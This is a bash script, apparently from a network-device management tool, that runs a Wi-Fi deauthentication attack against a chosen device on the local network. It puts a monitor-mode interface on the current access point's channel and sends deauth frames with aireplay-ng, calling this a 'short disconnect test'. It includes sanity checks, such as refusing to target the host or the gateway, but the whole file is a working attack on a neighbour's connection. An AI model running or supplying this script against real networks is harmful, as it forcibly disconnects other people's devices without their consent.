#!/usr/bin/env bash
set -euo pipefail

target_mac=${1:-}
target_mac=${target_mac^^}
iface=${2:-}
connection=${3:-}
monitor_iface=caelmon0

[[ "$target_mac" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]] || { printf 'Invalid target MAC address.\n' >&2; exit 2; }
[[ "$iface" =~ ^[a-zA-Z0-9_.:-]+$ && -d "/sys/class/net/$iface/phy80211" ]] || { printf 'Selected interface is not Wi-Fi. Refresh the local network devices page.\n' >&2; exit 2; }
[[ -n "$connection" ]] || { printf 'Missing Wi-Fi connection profile.\n' >&2; exit 2; }

if (( EUID != 0 )); then
    exec pkexec "$0" "$target_mac" "$iface" "$connection"
fi

own_mac=$(tr '[:lower:]' '[:upper:]' < "/sys/class/net/$iface/address")
gateway=$(ip -o -4 route show default dev "$iface" | awk 'NR==1 {print $3}')
gateway_mac=$(ip neigh show to "$gateway" dev "$iface" | awk '{for (i=1;i<=NF;i++) if ($i=="lladdr") print toupper($(i+1))}')
neighbour_ip=$(ip neigh show dev "$iface" | awk -v mac="$target_mac" 'toupper($0) ~ mac && $NF != "FAILED" && $NF != "INCOMPLETE" {print $1; exit}')
[[ -n "$neighbour_ip" ]] || { printf 'Target is not a currently discovered LAN neighbour. Scan again first.\n' >&2; exit 2; }
[[ "$target_mac" != "$own_mac" && "$target_mac" != "$gateway_mac" ]] || { printf 'Refusing to target this device or the gateway.\n' >&2; exit 2; }

wifi=$(nmcli -t --escape no -f IN-USE,BSSID,CHAN device wifi list ifname "$iface" --rescan no | awk -F: '$1 == "*" || $1 == "yes" {print; exit}')
IFS=: read -r _ b1 b2 b3 b4 b5 b6 channel <<<"$wifi"
bssid=${b1}:${b2}:${b3}:${b4}:${b5}:${b6}
[[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ && "$channel" =~ ^[0-9]+$ ]] || { printf 'Could not identify the active access point.\n' >&2; exit 1; }

phy=$(basename "$(readlink -f "/sys/class/net/$iface/phy80211")")
cleanup() {
    iw dev "$monitor_iface" del 2>/dev/null || true
    ip link set "$iface" up 2>/dev/null || true
    nmcli connection up id "$connection" ifname "$iface" >/dev/null 2>&1 || true
}
trap cleanup EXIT INT TERM

nmcli device disconnect "$iface" >/dev/null
ip link set "$iface" down
iw phy "$phy" interface add "$monitor_iface" type monitor
ip link set "$monitor_iface" up
iw dev "$monitor_iface" set channel "$channel"

printf 'Sending a short disconnect test to %s (%s) on your current access point.\n' "$neighbour_ip" "$target_mac"
aireplay-ng --deauth 5 -a "$bssid" -c "$target_mac" "$monitor_iface"
